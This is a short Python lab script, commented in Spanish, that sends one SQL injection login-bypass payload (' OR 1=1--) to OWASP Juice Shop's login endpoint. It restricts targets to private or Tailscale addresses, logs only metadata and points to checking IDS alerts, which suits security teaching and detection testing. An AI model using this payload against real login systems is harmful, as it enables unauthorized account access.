#!/usr/bin/env python3
"""Una sola prueba didactica SQLi en OWASP Juice Shop de laboratorio."""
import argparse
import datetime
import ipaddress
import json
import pathlib
import urllib.error
import urllib.request


def valid_lab_ip(raw):
    try:
        ip = ipaddress.ip_address(raw)
    except ValueError as exc:
        raise argparse.ArgumentTypeError('Use IPv4 numerica') from exc
    if ip.version != 4 or not (ip.is_private or ip in ipaddress.ip_network('100.64.0.0/10')) or ip.is_loopback:
        raise argparse.ArgumentTypeError('Solo IPv4 privada autorizada o Tailscale')
    return str(ip)


p = argparse.ArgumentParser(description='Ataque 3: SQLi didactica en endpoint de inicio de sesion de Juice Shop')
p.add_argument('--target', type=valid_lab_ip, required=True)
p.add_argument('--port', type=int, default=3000)
p.add_argument('--lab-confirm', action='store_true', required=True)
a = p.parse_args()
if not 1 <= a.port <= 65535:
    p.error('Puerto invalido')
url = f'http://{a.target}:{a.port}/rest/user/login'
# Payload clasico de laboratorio de OWASP Juice Shop; no usar contra sistemas ajenos.
payload = {'email': "' OR 1=1--", 'password': 'mini-soc-demostracion'}
req = urllib.request.Request(url, data=json.dumps(payload).encode(), headers={'Content-Type': 'application/json'}, method='POST')
body = b''
error = None
status = None
try:
    with urllib.request.urlopen(req, timeout=8) as response:
        status, body = response.status, response.read(4096)
except urllib.error.HTTPError as ex:
    status, body = ex.code, ex.read(4096)
except (urllib.error.URLError, TimeoutError) as ex:
    error = str(ex)
# Nunca guardar cuerpos de respuesta: podrian incluir tokens de sesion.
pathlib.Path('evidencias').mkdir(exist_ok=True)
log = pathlib.Path('evidencias') / f'03_sqli_{datetime.datetime.now():%Y%m%d_%H%M%S}.json'
record = {'momento': datetime.datetime.now().isoformat(), 'url': url, 'payload_email': payload['email'], 'http_status': status, 'error': error, 'response_bytes': len(body), 'nota': 'No se guarda cuerpo HTTP ni tokens. Un HTTP 200 no prueba por si solo una explotacion.'}
log.write_text(json.dumps(record, indent=2), encoding='utf-8')
print('Prueba SQLi terminada. HTTP:', status, 'error:', error)
print('Registro:', log)
print('Verifique por separado evidencia de explotacion, alerta IDS especifica de SQLi y registro HTTP de la app.')
